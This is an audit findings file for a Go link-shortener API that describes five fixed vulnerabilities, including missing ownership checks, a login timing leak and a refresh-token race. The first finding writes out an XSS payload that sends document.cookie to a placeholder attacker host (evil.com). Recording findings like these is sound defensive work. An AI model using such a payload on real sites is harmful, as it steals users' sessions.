# Security Findings

Identified during audit on 2026-04-30.

---

## [HIGH] Vuln 1: Open Redirect / XSS via `javascript:` URI

**Files:** `api/internal/handler/redirect.go:30`, `api/internal/dto/link.go:15–19`

The `OriginalURL` is redirected directly without scheme validation. The DTO only checks for non-empty string, allowing `javascript:`, `data:`, and arbitrary domains to be stored and redirected to.

**Exploit:** Authenticated attacker creates a link with `URL: "javascript:fetch('https://evil.com?c='+document.cookie)"`. Any user visiting `/{code}` triggers the payload. Also enables phishing via trusted-domain redirects.

**Fix:** Validate that the URL scheme is `http` or `https` in the DTO `Validate()` method.

**Status:** Fixed

---

## [HIGH] Vuln 2: Missing ownership check on `CreateLink`

**File:** `api/internal/handler/link.go:46–83`

`CreateLink` does not extract `userID` from context or compare it to `project.UserID`. Any authenticated user can create links in another user's projects if they know the slug.

**Exploit:** Attacker authenticates with own account, discovers a victim's project slug, and `POST /projects/{slug}/links` to inject malicious links into the victim's project.

**Fix:** Extract `userID` from context and verify `project.UserID == userID` before creating the link (same pattern already used by `UpdateLink` and `DeleteLink`).

**Status:** Fixed

---

## [HIGH] Vuln 3: Missing ownership check on `ListLinks` and `GetLink`

**File:** `api/internal/handler/link.go:85` and `link.go:151`

Both endpoints require authentication but do not verify the authenticated user owns the project. Any authenticated user can list or retrieve link details from other users' projects.

**Exploit:** Attacker enumerates `GET /projects/{slug}/links` or `GET /projects/{slug}/links/{code}` to access `original_url`, metadata, and `short_url` from private projects. Inconsistency: `UpdateLink` (line 195) and `DeleteLink` (line 234) already do this check correctly.

**Fix:** Same pattern as `UpdateLink` — extract `userID` from context, find project, compare `project.UserID`.

**Status:** Fixed

---

## [MEDIUM] Vuln 4: Email enumeration via timing attack on Login

**File:** `api/internal/handler/auth.go:83–92`

When an email does not exist, the handler returns immediately without running bcrypt (~1ms). When the email exists but the password is wrong, bcrypt runs (~100ms). The response time difference reveals which emails are registered.

**Exploit:** Attacker sends login requests against a list of emails and measures response time. Slow responses (~100ms) indicate registered emails, enabling targeted credential stuffing.

**Fix:** Always execute a dummy bcrypt comparison when the user is not found to ensure constant-time response.

**Status:** Fixed

---

## [MEDIUM] Vuln 5: Race condition in refresh token rotation

**File:** `api/internal/handler/auth.go:116–125`, `api/internal/repository/refresh_token.go`

The token check (`FindByTokenHash` + `RevokedAt` check) and the revocation (`Revoke`) are separate, non-atomic operations. Two concurrent requests with the same refresh token can both pass the check before either revokes it.

**Exploit:** Attacker intercepts a refresh token and fires two simultaneous `/auth/refresh` requests. Both find `RevokedAt == nil`, both generate a new token pair. The legitimate user's token is invalidated while the attacker holds an active session.

**Fix:** Replace the check+revoke sequence with an atomic `UPDATE ... WHERE revoked_at IS NULL RETURNING *` query that fails if the token was already revoked.

**Status:** Fixed
